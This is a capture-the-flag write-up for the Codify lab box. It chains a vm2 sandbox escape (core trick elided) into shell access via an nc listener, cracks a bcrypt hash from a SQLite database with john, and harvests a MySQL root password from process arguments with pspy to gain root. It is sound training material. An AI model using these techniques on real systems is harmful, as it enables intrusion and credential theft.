#Linux #Nodejs #vm2 #sandbox #SQLite #john #credentialhunting #sudo #pspy

## Overview

Codify is an easy Linux box centered on a sandbox escape. The site runs a Node.js code playground built on the **vm2** library, which has a long history of escapes, I use one to break out and execute commands as `svc`. From there a SQLite database yields a bcrypt hash that cracks to an SSH user, and root falls to a `sudo`-runnable backup script that leaks the MySQL root password to any process watcher.

## Recon

The app on ports 80/3000 is a JavaScript runner that advertises it sandboxes code with **vm2**.

## Foothold

### vm2 Sandbox Escape

> **Why vm2 keeps getting escaped:** vm2 tries to run untrusted JavaScript safely by proxying access to host objects. But JavaScript's reflection is deep, error stack traces, proxies, and constructor chains repeatedly expose a path back to the real `process` object. Once you reach `process.mainModule.require`, you can pull in `child_process` and run OS commands. This PoC abuses a `getPrototypeOf` proxy handler during error handling to grab the host constructor.

```js
const { VM } = require("vm2");
// ... proxy/error trick ...
const childProcess = c.constructor('return process')().mainModule.require('child_process');
childProcess.execSync('whoami');   // -> svc
```

Using that primitive one command at a time, I pulled my own `nc` binary onto the host, made it executable, and ran it for a full shell:

```sh
rlwrap nc -lvnp 53
whoami
svc
```

## Privilege Escalation

### SQLite Hash → joshua over SSH

A non-public part of the app lived in `/var/www/contact`, including `tickets.db`. Dumping its users table gave a bcrypt hash:

```sh
sqlite3 tickets.db
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

John cracked it, and the password worked for SSH as `joshua`:

```sh
john hash --wordlist=rockyou.txt   ->   ‹redacted›
ssh joshua@codify.htb
```

### sudo Backup Script, Leaking the Password via pspy

```sh
sudo -l
User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Reading the script revealed how it handles the DB password:

```bash
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
# ... mysql -u root -p<password from file> ...
```

> **The flaw:** the script reads a password and runs `mysql`/`mysqldump` by passing the *real* root password on the command line. Command lines are visible to every user via `/proc`. So even though the prompt hides my input, the actual root DB password appears in the process arguments each time the script runs, and `pspy` (which polls `/proc` for new processes) captures it.

```
CMD: UID=0  /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -p‹redacted› -e SHOW DATABASES;
```

That MySQL root password was reused by the system root account:

```sh
su root
root@codify:/tmp# whoami
root
```

## Root

Box rooted.

## Takeaways

- **vm2 is not a security boundary.** Treat any "we sandbox your JS with vm2" feature as RCE waiting to happen.
- **Hunt for SQLite databases in app directories**, `tickets.db` carried the hash that bridged to SSH.
- **Secrets on the command line leak via `/proc`.** A root cron/script that passes a password as a CLI argument can be harvested with `pspy`, no exploit required.
